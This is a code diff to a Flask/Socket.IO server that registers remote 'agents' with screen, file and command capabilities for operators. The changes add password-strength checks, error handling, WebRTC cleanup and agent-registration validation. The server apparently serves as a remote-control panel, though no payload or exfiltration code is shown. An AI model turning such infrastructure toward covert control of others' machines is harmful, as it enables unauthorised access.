@@ -42,6 +42,14 @@ class Config:
     if not ADMIN_PASSWORD:
         raise ValueError("ADMIN_PASSWORD environment variable is required. Please set a secure password.")
     
+    # Validate password strength
+    if len(ADMIN_PASSWORD) < 8:
+        raise ValueError("ADMIN_PASSWORD must be at least 8 characters long.")
+    if not any(c.isupper() for c in ADMIN_PASSWORD):
+        print("Warning: ADMIN_PASSWORD should contain uppercase letters for better security.")
+    if not any(c.isdigit() for c in ADMIN_PASSWORD):
+        print("Warning: ADMIN_PASSWORD should contain digits for better security.")
+    
     # Flask Configuration
     SECRET_KEY = os.environ.get('SECRET_KEY', None)
     
@@ -387,8 +395,12 @@ def create_secure_password_hash(password):
     """
     return hash_password(password)
 
-# Generate secure hash for admin password
-ADMIN_PASSWORD_HASH, ADMIN_PASSWORD_SALT = create_secure_password_hash(Config.ADMIN_PASSWORD)
+# Generate secure hash for admin password (with error handling)
+try:
+    ADMIN_PASSWORD_HASH, ADMIN_PASSWORD_SALT = create_secure_password_hash(Config.ADMIN_PASSWORD)
+except Exception as e:
+    print(f"Error creating admin password hash: {e}")
+    raise ValueError("Failed to create secure password hash. Please check your ADMIN_PASSWORD.")
 
 # WebRTC Utility Functions
 def create_webrtc_peer_connection(agent_id):
@@ -445,14 +457,22 @@ def close_webrtc_connection(agent_id):
     if agent_id in WEBRTC_PEER_CONNECTIONS:
         try:
             pc = WEBRTC_PEER_CONNECTIONS[agent_id]
-            # Use run_coroutine_threadsafe for synchronous context
+            # Properly handle async context
             try:
                 loop = asyncio.get_event_loop()
-                asyncio.run_coroutine_threadsafe(pc.close(), loop)
-            except RuntimeError:
-                # No event loop running, use asyncio.run
-                asyncio.run(pc.close())
-            del WEBRTC_PEER_CONNECTIONS[agent_id]
+                if loop.is_running():
+                    # If loop is running, schedule the coroutine
+                    future = asyncio.run_coroutine_threadsafe(pc.close(), loop)
+                    future.result(timeout=5)  # Wait up to 5 seconds
+                else:
+                    # If no loop or not running, use asyncio.run
+                    asyncio.run(pc.close())
+            except (RuntimeError, asyncio.TimeoutError) as e:
+                print(f"Warning: Could not cleanly close WebRTC connection for {agent_id}: {e}")
+                # Force cleanup even if close fails
+                pass
+            finally:
+                del WEBRTC_PEER_CONNECTIONS[agent_id]
         except Exception as e:
             print(f"Error closing WebRTC connection for {agent_id}: {e}")
     
@@ -581,8 +601,14 @@ def implement_frame_dropping(agent_id, load_threshold=0.8):
         return False
     
     try:
+        # Check if psutil is available first
+        try:
+            import psutil
+        except ImportError:
+            print("psutil not available for load monitoring")
+            return False
+            
         # Get current system load
-        import psutil
         cpu_percent = psutil.cpu_percent(interval=1)
         memory_percent = psutil.virtual_memory().percent
         
@@ -2805,6 +2831,11 @@ def get_system_info():
     
     return jsonify(info)
 
+# Video/Audio Frame Storage
+VIDEO_FRAMES_H264 = defaultdict(lambda: None)
+CAMERA_FRAMES_H264 = defaultdict(lambda: None)
+AUDIO_FRAMES_OPUS = defaultdict(lambda: None)
+
 # --- Socket.IO Event Handlers ---
 
 @socketio.on('connect')
@@ -2861,39 +2892,47 @@ def _emit_agent_config(agent_id: str):
 @socketio.on('agent_connect')
 def handle_agent_connect(data):
     """When an agent connects and registers itself."""
-    agent_id = data.get('agent_id')
-    if not agent_id:
-        return
-    
-    # Store agent information
-    AGENTS_DATA[agent_id]["sid"] = request.sid
-    AGENTS_DATA[agent_id]["last_seen"] = datetime.datetime.utcnow().isoformat() + "Z"
-    AGENTS_DATA[agent_id]["name"] = data.get('name', f'Agent-{agent_id}')
-    AGENTS_DATA[agent_id]["platform"] = data.get('platform', 'Unknown')
-    AGENTS_DATA[agent_id]["ip"] = data.get('ip', request.environ.get('REMOTE_ADDR', '0.0.0.0'))
-    AGENTS_DATA[agent_id]["capabilities"] = data.get('capabilities', ['screen', 'files', 'commands'])
-    AGENTS_DATA[agent_id]["cpu_usage"] = data.get('cpu_usage', 0)
-    AGENTS_DATA[agent_id]["memory_usage"] = data.get('memory_usage', 0)
-    AGENTS_DATA[agent_id]["network_usage"] = data.get('network_usage', 0)
-    AGENTS_DATA[agent_id]["system_info"] = data.get('system_info', {})
-    AGENTS_DATA[agent_id]["uptime"] = data.get('uptime', 0)
-    
-    # Notify all operators of the new agent
-    emit('agent_list_update', AGENTS_DATA, room='operators', broadcast=True)
-    
-    # Log activity
-    emit('activity_update', {
-        'id': f'act_{int(time.time())}',
-        'type': 'connection',
-        'action': 'Agent Connected',
-        'details': f'Agent {agent_id} successfully connected',
-        'agent_id': agent_id,
-        'agent_name': AGENTS_DATA[agent_id]["name"],
-        'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
-        'status': 'success'
-    }, room='operators', broadcast=True)
-    print(f"Agent {agent_id} connected with SID {request.sid}")
-    pass
+    try:
+        if not data or not isinstance(data, dict):
+            print(f"Invalid agent_connect data received: {data}")
+            return
+            
+        agent_id = data.get('agent_id')
+        if not agent_id:
+            print("Agent connection attempt without agent_id")
+            return
+        
+        # Store agent information
+        AGENTS_DATA[agent_id]["sid"] = request.sid
+        AGENTS_DATA[agent_id]["last_seen"] = datetime.datetime.utcnow().isoformat() + "Z"
+        AGENTS_DATA[agent_id]["name"] = data.get('name', f'Agent-{agent_id}')
+        AGENTS_DATA[agent_id]["platform"] = data.get('platform', 'Unknown')
+        AGENTS_DATA[agent_id]["ip"] = data.get('ip', request.environ.get('REMOTE_ADDR', '0.0.0.0'))
+        AGENTS_DATA[agent_id]["capabilities"] = data.get('capabilities', ['screen', 'files', 'commands'])
+        AGENTS_DATA[agent_id]["cpu_usage"] = data.get('cpu_usage', 0)
+        AGENTS_DATA[agent_id]["memory_usage"] = data.get('memory_usage', 0)
+        AGENTS_DATA[agent_id]["network_usage"] = data.get('network_usage', 0)
+        AGENTS_DATA[agent_id]["system_info"] = data.get('system_info', {})
+        AGENTS_DATA[agent_id]["uptime"] = data.get('uptime', 0)
+        
+        # Notify all operators of the new agent
+        emit('agent_list_update', AGENTS_DATA, room='operators', broadcast=True)
+        
+        # Log activity
+        emit('activity_update', {
+            'id': f'act_{int(time.time())}',
+            'type': 'connection',
+            'action': 'Agent Connected',
+            'details': f'Agent {agent_id} successfully connected',
+            'agent_id': agent_id,
+            'agent_name': AGENTS_DATA[agent_id]["name"],
+            'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
+            'status': 'success'
+        }, room='operators', broadcast=True)
+        print(f"Agent {agent_id} connected with SID {request.sid}")
+    except Exception as e:
+        print(f"Error handling agent_connect: {e}")
+        emit('registration_error', {'message': 'Failed to register agent'}, room=request.sid)
 
 @socketio.on('execute_command')
 def handle_execute_command(data):
